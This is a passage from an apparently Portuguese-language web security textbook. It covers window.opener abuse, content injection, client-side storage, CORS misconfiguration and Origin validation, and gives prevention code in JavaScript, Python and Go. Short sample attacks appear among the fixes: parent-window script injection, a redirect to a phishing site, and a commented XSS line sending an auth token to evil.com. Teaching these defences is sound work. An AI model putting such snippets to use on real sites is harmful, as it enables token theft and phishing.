    if (document.referrer && document.referrer !== window.location.href) {
        // Registrar redirecionamento
        console.log('Page redirect detected from:', document.referrer);
    }
});
```

---

## 6.7 Window.opener Attacks

### 6.7.1 Exploração do Window.opener

O objeto `window.opener` fornece referência à janela que abriu a janela atual. Ele pode ser explorado de várias maneiras:

**Acesso ao DOM da janela pai:**
```javascript
// Acessar e manipular o DOM da janela que abriu esta
if (window.opener) {
    const originalDoc = window.opener.document;
    // Injetar script malicioso
    const script = originalDoc.createElement('script');
    script.textContent = 'stealCookies()';
    originalDoc.body.appendChild(script);
}
```

**Navegação da janela pai:**
```javascript
// Redirecionar a janela pai para site malicioso
if (window.opener) {
    window.opener.location = 'https://phishing-site.com';
}
```

**Leitura de dados da janela pai:**
```javascript
// Tentar acessar dados sensíveis da janela pai
if (window.opener) {
    try {
        const cookies = window.opener.document.cookie;
        const localStorage = window.opener.localStorage;
        // Enviar dados roubados para servidor do atacante
    } catch (e) {
        // Mesmo que bloqueado, a tentativa pode revelar informações
    }
}
```

### 6.7.2 Defesas Contra Window.opener Attacks

**Remover window.opener:**
```javascript
// Ao abrir nova janela
const newWindow = window.open('https://example.com', '_blank');
newWindow.opener = null;

// Ou usar a versão mais moderna
window.open('https://example.com', '_blank', 'noopener');
```

**Content Security Policy:**
```
Content-Security-Policy: sandbox allow-scripts; script-src 'self'
```

**Política de Same-Origin:**
```javascript
// No iframe filho, verificar se tem acesso ao pai
if (window.parent !== window) {
    // Estamos em um iframe
    try {
        // Tentar acessar o pai (deve falhar se same-origin policy estiver ativa)
        window.parent.document;
    } catch (e) {
        // E esperado que falhe - boa prática
    }
}
```

---

## 6.8 Content Injection Attacks

### 6.8.1 Tipos de Content Injection

Content injection occurs when an attacker can inject content into a web page viewed by other users. This can include HTML injection, script injection, and other forms of content manipulation.

**HTML Injection:**
```javascript
// VULNERABLE - Direct HTML insertion
element.innerHTML = userInput;

// SECURE - Use textContent for plain text
element.textContent = userInput;

// SECURE - Sanitize HTML if needed
element.innerHTML = DOMPurify.sanitize(userInput);
```

**Script Injection:**
```javascript
// VULNERABLE - Dynamic script execution
const script = document.createElement('script');
script.textContent = userInput;
document.body.appendChild(script);

// VULNERABLE - eval with user input
eval(userInput);

// SECURE - Never use eval with user input
// Use JSON.parse instead for data
try {
    const data = JSON.parse(userInput);
} catch (e) {
    // Handle invalid JSON
}
```

**CSS Injection:**
```javascript
// VULNERABLE - Dynamic CSS
element.style.cssText = userInput;

// VULNERABLE - Style attribute injection
element.setAttribute('style', userInput);

// SECURE - Validate CSS
function validateCSS(css) {
    const allowedProperties = ['color', 'font-size', 'margin'];
    const parsed = css.split(';');
    return parsed.every(prop => {
        const [name] = prop.split(':');
        return allowedProperties.includes(name.trim());
    });
}
```

### 6.8.2 DOM-Based Content Injection

DOM-based injection occurs when client-side code processes untrusted data and inserts it into the DOM without proper sanitization.

**Unsafe sink functions:**
```javascript
// These functions are potential sinks for DOM injection
element.innerHTML = data;
element.outerHTML = data;
document.write(data);
document.writeln(data);
element.insertAdjacentHTML('beforeend', data);
element.insertAdjacentHTML('afterend', data);
eval(data);
setTimeout(data);
setInterval(data);
new Function(data)();
```

**Safe alternatives:**
```javascript
// Use safe alternatives
element.textContent = data;
element.innerText = data;
element.setAttribute('data-value', data);
element.dataset.value = data;

// For HTML content, use DOMPurify
element.innerHTML = DOMPurify.sanitize(data, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href', 'title']
});

// Use template literals with proper escaping
element.textContent = `Hello, ${escapeHtml(userInput)}`;
```

### 6.8.3 Content Security Policy for Injection Prevention

```
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-random123';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self'
```

---

## 6.9 Client-Side Storage Security

### 6.9.1 localStorage Security

localStorage provides a simple key-value store that persists across browser sessions. It is synchronous and accessible via JavaScript.

**Security concerns:**

**XSS vulnerability:** Any XSS attack can access all data in localStorage. Unlike cookies, localStorage has no built-in protection against XSS.

```javascript
// VULNERABLE - Storing sensitive data in localStorage
localStorage.setItem('authToken', 'secret-token');
localStorage.setItem('userEmail', 'user@example.com');

// Any XSS can access this data
// <script>fetch('https://evil.com/steal?token=' + localStorage.getItem('authToken'))</script>
```

**No expiration:** Data in localStorage persists indefinitely unless explicitly removed. This increases the window of opportunity for attackers.

**No scope control:** localStorage is shared across all tabs and windows from the same origin. This can lead to race conditions and data leakage.

**Best practices:**

```javascript
// Use sessionStorage for temporary data
sessionStorage.setItem('tempData', JSON.stringify(data));

// Encrypt sensitive data before storing
async function secureStore(key, value) {
    const encrypted = await encrypt(JSON.stringify(value));
    localStorage.setItem(key, encrypted);
}

// Implement auto-expiry
function storeWithExpiry(key, value, ttl) {
    const item = {
        value: value,
        expiry: Date.now() + ttl
    };
    localStorage.setItem(key, JSON.stringify(item));
}

function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key);
    if (!itemStr) return null;

    const item = JSON.parse(itemStr);
    if (Date.now() > item.expiry) {
        localStorage.removeItem(key);
        return null;
    }
    return item.value;
}
```

### 6.9.2 sessionStorage Security

sessionStorage is similar to localStorage but is scoped to the current tab and cleared when the tab is closed.

**Security considerations:**

```javascript
// Store data in sessionStorage
sessionStorage.setItem('csrfToken', generateToken());

// Clear sensitive data when no longer needed
sessionStorage.removeItem('csrfToken');

// Use for single-session data
sessionStorage.setItem('tempData', JSON.stringify({
    timestamp: Date.now(),
    data: sensitiveData
}));
```

### 6.9.3 IndexedDB Security

IndexedDB is a more complex client-side storage API that supports structured data, indexes, and transactions.

**Security considerations:**

```javascript
// Open database with version control
const request = indexedDB.open('MyDatabase', 1);

request.onerror = (event) => {
    console.error('Database error:', event.target.error);
};

request.onsuccess = (event) => {
    const db = event.target.result;
    
    // Store encrypted data
    const transaction = db.transaction(['users'], 'readwrite');
    const store = transaction.objectStore('users');
    
    // Encrypt before storing
    encryptSensitiveData(userData).then(encrypted => {
        store.put(encrypted);
    });
};

request.onupgradeneeded = (event) => {
    const db = event.target.result;
    const objectStore = db.createObjectStore('users', { keyPath: 'id' });
    objectStore.createIndex('email', 'email', { unique: true });
};
```

### 6.9.4 Web Crypto API for Client-Side Encryption

```javascript
// Generate encryption key
async function generateKey() {
    return await crypto.subtle.generateKey(
        {
            name: 'AES-GCM',
            length: 256
        },
        true,
        ['encrypt', 'decrypt']
    );
}

// Encrypt data
async function encryptData(key, data) {
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encodedData = new TextEncoder().encode(JSON.stringify(data));
    
    const encrypted = await crypto.subtle.encrypt(
        {
            name: 'AES-GCM',
            iv: iv
        },
        key,
        encodedData
    );
    
    return {
        iv: Array.from(iv),
        data: Array.from(new Uint8Array(encrypted))
    };
}

// Decrypt data
async function decryptData(key, encryptedData) {
    const iv = new Uint8Array(encryptedData.iv);
    const data = new Uint8Array(encryptedData.data);
    
    const decrypted = await crypto.subtle.decrypt(
        {
            name: 'AES-GCM',
            iv: iv
        },
        key,
        data
    );
    
    return JSON.parse(new TextDecoder().decode(decrypted));
}
```

---

## 6.10 CORS Misconfiguration Attacks

### 6.10.1 Common CORS Misconfigurations

CORS misconfigurations can lead to various security issues, including data leakage and unauthorized access.

**Wildcard origin:**
```
# VULNERABLE - Allows any origin
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Reflecting origin without validation:**
```python
# VULNERABLE - Reflects any origin
@app.route('/api/data')
def get_data():
    origin = request.headers.get('Origin')
    response = make_response(jsonify(data))
    response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response
```

**Trusting subdomains without validation:**
```python
# VULNERABLE - Trusts any subdomain
@app.route('/api/data')
def get_data():
    origin = request.headers.get('Origin')
    if origin and '.example.com' in origin:
        response = make_response(jsonify(data))
        response.headers['Access-Control-Allow-Origin'] = origin
        return response
```

### 6.10.2 Proper CORS Configuration

```python
from flask import Flask, request, make_response, jsonify

app = Flask(__name__)

ALLOWED_ORIGINS = [
    'https://app.example.com',
    'https://admin.example.com',
    'https://api.example.com'
]

def is_origin_allowed(origin):
    if not origin:
        return False
    return origin in ALLOWED_ORIGINS

@app.before_request
def handle_cors():
    origin = request.headers.get('Origin')
    
    if request.method == 'OPTIONS':
        response = make_response()
        if is_origin_allowed(origin):
            response.headers['Access-Control-Allow-Origin'] = origin
            response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
            response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-CSRF-Token'
            response.headers['Access-Control-Allow-Credentials'] = 'true'
            response.headers['Access-Control-Max-Age'] = '3600'
        return response
    
    return None

@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')
    if is_origin_allowed(origin):
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response
```

### 6.10.3 Preflight Request Handling

```javascript
// Node.js/Express CORS configuration
const cors = require('cors');

const corsOptions = {
    origin: function (origin, callback) {
        const allowedOrigins = [
            'https://app.example.com',
            'https://admin.example.com'
        ];
        
        if (!origin || allowedOrigins.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
    exposedHeaders: ['X-Total-Count'],
    maxAge: 600
};

app.use(cors(corsOptions));

// Handle preflight requests
app.options('*', cors(corsOptions));
```

### 6.10.4 CORS Testing and Validation

```javascript
// Test CORS configuration
async function testCors(origin) {
    try {
        const response = await fetch('https://api.example.com/data', {
            method: 'GET',
            headers: {
                'Origin': origin
            },
            credentials: 'include'
        });
        
        const allowedOrigin = response.headers.get('Access-Control-Allow-Origin');
        const credentials = response.headers.get('Access-Control-Allow-Credentials');
        
        console.log('Origin:', origin);
        console.log('Allowed-Origin:', allowedOrigin);
        console.log('Credentials:', credentials);
        
        if (allowedOrigin === '*' && credentials === 'true') {
            console.warn('WARNING: Wildcard origin with credentials is vulnerable!');
        }
        
        if (allowedOrigin === origin && credentials === 'true') {
            console.log('CORS configured correctly for this origin');
        }
    } catch (error) {
        console.error('CORS test failed:', error);
    }
}

// Test with different origins
testCors('https://evil.com');
testCors('https://app.example.com');
testCors('https://subdomain.example.com');
```

---

## 6.11 Origin Header Validation

### 6.11.1 Understanding the Origin Header

The `Origin` header is sent by browsers in cross-origin requests and contains the scheme, host, and port of the requesting origin. It is crucial for validating the legitimacy of requests.

**When the Origin header is sent:**
- Cross-origin `fetch` and `XMLHttpRequest`
- Cross-origin form submissions
- Cross-origin `postMessage`
- Preflight requests

**When the Origin header is NOT sent:**
- Same-origin requests
- Requests from `file://` or `data://` origins
- Some older browsers

### 6.11.2 Origin Validation Techniques

```python
# Flask example
from flask import request, abort

ALLOWED_ORIGINS = {
    'https://app.example.com',
    'https://admin.example.com'
}

@app.before_request
def validate_origin():
    # Skip validation for same-origin requests
    if request.referrer and request.referrer.startswith(request.host_url):
        return
    
    origin = request.headers.get('Origin')
    
    # If Origin header is present, validate it
    if origin:
        if origin not in ALLOWED_ORIGINS:
            abort(403, description='Origin not allowed')
    
    # If Origin header is missing but Referer is present, validate Referer
    elif request.referrer:
        from urllib.parse import urlparse
        referer = urlparse(request.referrer)
        referer_origin = f"{referer.scheme}://{referer.netloc}"
        
        if referer_origin not in ALLOWED_ORIGINS:
            abort(403, description='Referer not allowed')
```

```javascript
// Express.js example
function validateOrigin(req, res, next) {
    const allowedOrigins = [
        'https://app.example.com',
        'https://admin.example.com'
    ];
    
    // Skip validation for same-origin requests
    const referer = req.get('Referer') || req.get('Referrer');
    if (referer && referer.startsWith(`${req.protocol}://${req.get('host')}`)) {
        return next();
    }
    
    const origin = req.get('Origin');
    
    // If Origin header is present, validate it
    if (origin) {
        if (!allowedOrigins.includes(origin)) {
            return res.status(403).json({ error: 'Origin not allowed' });
        }
    }
    // If Origin header is missing but Referer is present, validate Referer
    else if (referer) {
        try {
            const refererUrl = new URL(referer);
            const refererOrigin = `${refererUrl.protocol}//${refererUrl.host}`;
            
            if (!allowedOrigins.includes(refererOrigin)) {
                return res.status(403).json({ error: 'Referer not allowed' });
            }
        } catch (e) {
            return res.status(403).json({ error: 'Invalid Referer' });
        }
    }
    
    next();
}
```

### 6.11.3 CSRF Token Validation with Origin Check

```python
# Combined CSRF and Origin validation
import hmac
import hashlib
import time
from functools import wraps
from flask import request, abort, session

def csrf_protect(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Validate Origin header
        origin = request.headers.get('Origin')
        referer = request.headers.get('Referer')
        
        valid_origins = {
            'https://app.example.com',
            'https://admin.example.com'
        }
        
        origin_valid = False
        
        if origin:
            origin_valid = origin in valid_origins
        elif referer:
            from urllib.parse import urlparse
            parsed = urlparse(referer)
            referer_origin = f"{parsed.scheme}://{parsed.netloc}"
            origin_valid = referer_origin in valid_origins
        
        if not origin_valid:
            abort(403, description='Invalid origin')
        
        # Validate CSRF token
        csrf_token = request.headers.get('X-CSRF-Token') or request.form.get('csrf_token')
        session_token = session.get('csrf_token')
        
        if not csrf_token or not session_token:
            abort(403, description='CSRF token missing')
        
        if not hmac.compare_digest(csrf_token, session_token):
            abort(403, description='CSRF token invalid')
        
        return f(*args, **kwargs)
    
    return decorated_function
```

### 6.11.4 Handling Missing Origin Headers

```python
# Handle cases where Origin header is missing
@app.before_request
def handle_missing_origin():
    # Some legitimate requests don't send Origin header:
    # - Same-origin requests
    # - Direct navigation
    # - Bookmarks
    # - Some older browsers
    
    # For state-changing requests, require either Origin or Referer
    if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
        origin = request.headers.get('Origin')
        referer = request.headers.get('Referer')
        
        if not origin and not referer:
            # Could be a legitimate same-origin request or a script
            # Be more careful with state-changing operations
            if request.is_json:
                return make_response(
                    jsonify({'error': 'Origin header required for this operation'}),
                    403
                )
    
    return None
```

---

## 6.12 Complete Prevention Code in JS/Python/Go

### 6.12.1 JavaScript (Node.js/Express) Complete Solution

```javascript
const express = require('express');
const session = require('express-session');
const helmet = require('helmet');
const cors = require('cors');
const csrf = require('csurf');
const crypto = require('crypto');

const app = express();

// Security Headers
app.use(helmet());
app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'nonce-random123'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        fontSrc: ["'self'"],
        connectSrc: ["'self'", "https://api.example.com"],
        frameSrc: ["'none'"],
        frameAncestors: ["'none'"],
        baseUri: ["'self'"],
        formAction: ["'self'"],
        upgradeInsecureRequests: []
    }
}));

// Session Configuration
app.use(session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        sameSite: 'lax',
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
}));

// CORS Configuration
const allowedOrigins = [
    'https://app.example.com',
    'https://admin.example.com'
];

app.use(cors({
    origin: function (origin, callback) {
        if (!origin || allowedOrigins.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
    maxAge: 600
}));

// CSRF Protection
const csrfProtection = csrf({
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        sameSite: 'lax'
    }
});

// Origin Validation Middleware
function validateOrigin(req, res, next) {
    const origin = req.get('Origin');
    const referer = req.get('Referer');
    
    if (req.method === 'OPTIONS') {
        return next();
    }
    
    if (origin) {
        if (!allowedOrigins.includes(origin)) {
            return res.status(403).json({ error: 'Invalid origin' });
        }
    } else if (referer) {
        try {
            const refererUrl = new URL(referer);
            const refererOrigin = `${refererUrl.protocol}//${refererUrl.host}`;
            if (!allowedOrigins.includes(refererOrigin)) {
                return res.status(403).json({ error: 'Invalid referer' });
            }
        } catch (e) {
            return res.status(403).json({ error: 'Invalid referer URL' });
        }
    }
    
    next();
}

// Rate Limiting
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests'
});
app.use('/api/', limiter);

// Content Validation Middleware
function sanitizeInput(input) {
    if (typeof input === 'string') {
        return input
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
    }
    return input;
}

// Request Validation
function validateRequest(req, res, next) {
    // Validate Content-Type
    const contentType = req.get('Content-Type');
    if (req.method === 'POST' || req.method === 'PUT') {
        if (!contentType || !contentType.includes('application/json')) {
            return res.status(415).json({ error: 'Unsupported Media Type' });
        }
    }
    
    // Validate request size
    const contentLength = parseInt(req.get('Content-Length') || '0');
    if (contentLength > 1024 * 1024) { // 1MB
        return res.status(413).json({ error: 'Request too large' });
    }
    
    next();
}

// Routes
app.get('/form', csrfProtection, (req, res) => {
    res.json({
        csrfToken: req.csrfToken(),
        message: 'Form loaded'
    });
});

app.post('/submit', 
    validateOrigin,
    validateRequest,
    csrfProtection,
    (req, res) => {
        try {
            const { name, email, message } = req.body;
            
            // Sanitize inputs
            const sanitizedName = sanitizeInput(name);
            const sanitizedEmail = sanitizeInput(email);
            const sanitizedMessage = sanitizeInput(message);
            
            // Process the form
            res.json({
                success: true,
                message: 'Form submitted successfully',
                data: {
                    name: sanitizedName,
                    email: sanitizedEmail,
                    message: sanitizedMessage
                }
            });
        } catch (error) {
            res.status(500).json({ error: 'Internal server error' });
        }
    }
);

// Error Handling
app.use((err, req, res, next) => {
    if (err.code === 'EBADCSRFTOKEN') {
        return res.status(403).json({ error: 'Invalid CSRF token' });
    }
    res.status(500).json({ error: 'Internal server error' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
```

### 6.12.2 Python (Flask) Complete Solution

```python
from flask import Flask, request, make_response, jsonify, session
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import secrets
import hmac
import hashlib
from functools import wraps
from urllib.parse import urlparse
import json

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# Rate Limiter
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

# Configuration
ALLOWED_ORIGINS = [
    'https://app.example.com',
    'https://admin.example.com'
]

# CORS Middleware
@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')
    
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-CSRF-Token'
        response.headers['Access-Control-Max-Age'] = '3600'
    
    return response

# CSRF Token Generation
def generate_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

# Origin Validation Decorator
def validate_origin(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if request.method == 'OPTIONS':
            return f(*args, **kwargs)
        
        origin = request.headers.get('Origin')
        referer = request.headers.get('Referer')
        
        origin_valid = False
        
        if origin:
            origin_valid = origin in ALLOWED_ORIGINS
        elif referer:
            parsed = urlparse(referer)
            referer_origin = f"{parsed.scheme}://{parsed.netloc}"
            origin_valid = referer_origin in ALLOWED_ORIGINS
        
        if not origin_valid:
            return make_response(
                jsonify({'error': 'Invalid origin'}), 403
            )
        
        return f(*args, **kwargs)
    return decorated_function

# CSRF Protection Decorator
def csrf_protect(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
            # Check CSRF token
            csrf_token = request.headers.get('X-CSRF-Token')
            if not csrf_token:
                csrf_token = request.form.get('csrf_token')
            
            session_token = session.get('csrf_token')
            
            if not csrf_token or not session_token:
                return make_response(
                    jsonify({'error': 'CSRF token missing'}), 403
                )
            
            if not hmac.compare_digest(csrf_token, session_token):
                return make_response(
                    jsonify({'error': 'CSRF token invalid'}), 403
                )
        
        return f(*args, **kwargs)
    return decorated_function

# Input Sanitization
def sanitize_input(data):
    if isinstance(data, str):
        # Remove HTML tags
        import re
        clean = re.compile('<.*?>')
        return re.sub(clean, '', data)
    elif isinstance(data, dict):
        return {k: sanitize_input(v) for k, v in data.items()}
    elif isinstance(data, list):
        return [sanitize_input(i) for i in data]
    return data

# Content Security Policy
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self'; "
        "connect-src 'self' https://api.example.com; "
        "frame-ancestors 'none'; "
        "base-uri 'self'; "
        "form-action 'self'"
    )
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=()'
    
    return response

# Routes
@app.route('/form')
def get_form():
    csrf_token = generate_csrf_token()
    return jsonify({
        'csrf_token': csrf_token,
        'message': 'Form loaded'
    })

@app.route('/submit', methods=['POST'])
@validate_origin
@csrf_protect
@limiter.limit("10 per minute")
def submit_form():
    try:
        data = request.get_json()
        
        if not data:
            return make_response(
                jsonify({'error': 'No data provided'}), 400
            )
        
        # Sanitize inputs
        sanitized_data = sanitize_input(data)
        
        # Process the form
        return jsonify({
            'success': True,
            'message': 'Form submitted successfully',
            'data': sanitized_data
        })
        
    except Exception as e:
        return make_response(
            jsonify({'error': 'Internal server error'}), 500
        )

@app.route('/api/data')
@validate_origin
@limiter.limit("100 per hour")
def get_data():
    return jsonify({
        'data': 'sensitive data',
        'timestamp': secrets.token_hex(16)
    })

if __name__ == '__main__':
    app.run(debug=False)
```

### 6.12.3 Go Complete Solution

```go
package main

import (
    "crypto/rand"
    "crypto/subtle"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "log"
    "net/http"
    "strings"
    "time"
)

// Configuration
var allowedOrigins = map[string]bool{
    "https://app.example.com":    true,
    "https://admin.example.com":  true,
}

// CSRF Token Storage (in production, use Redis or database)
var csrfTokens = make(map[string]string)

// Generate random token
func generateToken() (string, error) {
    bytes := make([]byte, 32)
    if _, err := rand.Read(bytes); err != nil {
        return "", err
    }
    return hex.EncodeToString(bytes), nil
}

// CORS Middleware
func corsMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        origin := r.Header.Get("Origin")
        
        if allowedOrigins[origin] {
            w.Header().Set("Access-Control-Allow-Origin", origin)
            w.Header().Set("Access-Control-Allow-Credentials", "true")
            w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
            w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-CSRF-Token")
            w.Header().Set("Access-Control-Max-Age", "3600")
        }
        
        if r.Method == "OPTIONS" {
            w.WriteHeader(http.StatusOK)
            return
        }
        
        next.ServeHTTP(w, r)
    })
}

// Security Headers Middleware
func securityHeaders(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Security-Policy", 
            "default-src 'self'; "+
            "script-src 'self'; "+
            "style-src 'self' 'unsafe-inline'; "+
            "img-src 'self' data: https:; "+
            "font-src 'self'; "+
            "connect-src 'self' https://api.example.com; "+
            "frame-ancestors 'none'; "+
            "base-uri 'self'; "+
            "form-action 'self'")
        w.Header().Set("X-Frame-Options", "DENY")
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.Header().Set("X-XSS-Protection", "1; mode=block")
        w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
        w.Header().Set("Permissions-Policy", "camera=(), microphone=(), geolocation=()")
        
        next.ServeHTTP(w, r)
    })
}

// Origin Validation Middleware
func validateOrigin(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if r.Method == "OPTIONS" {
            next.ServeHTTP(w, r)
            return
        }
        
        origin := r.Header.Get("Origin")
        referer := r.Header.Get("Referer")
        
        originValid := false
        
        if origin != "" {
            originValid = allowedOrigins[origin]
        } else if referer != "" {
            refererOrigin := getOriginFromURL(referer)
            originValid = allowedOrigins[refererOrigin]
        }
        
        if !originValid {
            http.Error(w, "Invalid origin", http.StatusForbidden)
            return
        }
        
        next.ServeHTTP(w, r)
    })
}

// CSRF Protection Middleware
func csrfProtect(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if r.Method == "POST" || r.Method == "PUT" || r.Method == "DELETE" || r.Method == "PATCH" {
            csrfToken := r.Header.Get("X-CSRF-Token")
            if csrfToken == "" {
                csrfToken = r.FormValue("csrf_token")
            }
            
            sessionToken := r.Header.Get("X-Session-Token")
            
            if csrfToken == "" || sessionToken == "" {
                http.Error(w, "CSRF token missing", http.StatusForbidden)
                return
            }
            
            if subtle.ConstantTimeCompare([]byte(csrfToken), []byte(sessionToken)) != 1 {
                http.Error(w, "CSRF token invalid", http.StatusForbidden)
                return
            }
        }
        
        next.ServeHTTP(w, r)
    })
}

// Input Sanitization
func sanitizeInput(input string) string {
    // Remove HTML tags
    result := strings.ReplaceAll(input, "<", "&lt;")
    result = strings.ReplaceAll(result, ">", "&gt;")
    result = strings.ReplaceAll(result, "\"", "&quot;")
    result = strings.ReplaceAll(result, "'", "&#x27;")
    return result
}

// Get origin from URL
func getOriginFromURL(url string) string {
    if strings.HasPrefix(url, "//") {
        url = "https:" + url
    }
    
    parts := strings.SplitN(url, "/", 4)
    if len(parts) >= 3 {
        return parts[0] + "//" + parts[2]
    }
    return ""
}

// Rate Limiter (simple implementation)
var requestCounts = make(map[string][]time.Time)

func rateLimit(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        clientIP := r.RemoteAddr
        now := time.Now()
        
        // Clean old entries
        if requests, exists := requestCounts[clientIP]; exists {
            validRequests := []time.Time{}
            for _, reqTime := range requests {
                if now.Sub(reqTime) < time.Minute {
                    validRequests = append(validRequests, reqTime)
                }
            }
            requestCounts[clientIP] = validRequests
        }
        
        // Check rate limit
        if len(requestCounts[clientIP]) > 100 {
            http.Error(w, "Rate limit exceeded", http.StatusTooManyRequests)
            return
        }
        
        // Add current request
        requestCounts[clientIP] = append(requestCounts[clientIP], now)
        
        next.ServeHTTP(w, r)
    })
}

// CSRF Token Handler
func csrfTokenHandler(w http.ResponseWriter, r *http.Request) {
    token, err := generateToken()
    if err != nil {
        http.Error(w, "Internal server error", http.StatusInternalServerError)
        return
    }
    
    // Store token (in production, use session or Redis)
    sessionID := r.Header.Get("X-Session-Token")
    csrfTokens[sessionID] = token
    
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(map[string]string{
        "csrf_token": token,
    })
}

// Form Submission Handler
func submitHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method != "POST" {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }
    
    var data map[string]interface{}
    if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
        http.Error(w, "Invalid JSON", http.StatusBadRequest)
        return
    }
    
    // Sanitize inputs
    sanitizedData := make(map[string]interface{})
    for key, value := range data {
        if strValue, ok := value.(string); ok {
            sanitizedData[key] = sanitizeInput(strValue)
        } else {
            sanitizedData[key] = value
        }
    }
    
    // Process the form
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(map[string]interface{}{
        "success": true,
        "message": "Form submitted successfully",
        "data":    sanitizedData,
    })
}

func main() {
    // Create handlers
    csrfHandler := http.HandlerFunc(csrfTokenHandler)
    submitHandler := http.HandlerFunc(submitHandler)
    
    // Apply middleware chain
    http.Handle("/form", securityHeaders(corsMiddleware(csrfHandler)))
    http.Handle("/submit", securityHeaders(corsMiddleware(validateOrigin(csrfProtect(rateLimit(submitHandler))))))
    
    // Start server
    fmt.Println("Server starting on :8080")
    log.Fatal(http.ListenAndServe(":8080", nil))
}
```

---

## 6.13 Exercicios

### Exercicio 1: Identificando Vulnerabilidades CSRF

Analise o seguinte codigo e identifique todas as vulnerabilidades CSRF:

```php
<?php
// login.php
session_start();
if ($_POST['username'] && $_POST['password']) {
    $_SESSION['user'] = $_POST['username'];
    header('Location: dashboard.php');
    exit;
}
?>

<!-- dashboard.php -->
<html>
<body>
    <h1>Dashboard</h1>
    <form action="transfer.php" method="POST">
        <input type="text" name="to" placeholder="Recipient">
        <input type="number" name="amount" placeholder="Amount">
        <button type="submit">Transfer</button>
    </form>
</body>
</html>
```

**Perguntas:**
1. Quais vulnerabilidades CSRF existem neste codigo?
2. O que acontece se um usuario logado visitar um site malicioso que contem um formulario automatico?
3. Proponha uma correcao para cada vulnerabilidade encontrada.

### Exercicio 2: Configurando CSP para Clickjacking

Escreva uma politica CSP completa que:
- Previna clickjacking em todas as paginas
- Permita que o site seja embutido em iframes apenas em um dominio especifico (trusted.example.com)
- Inclua todas as protecoes adicionais recomendadas
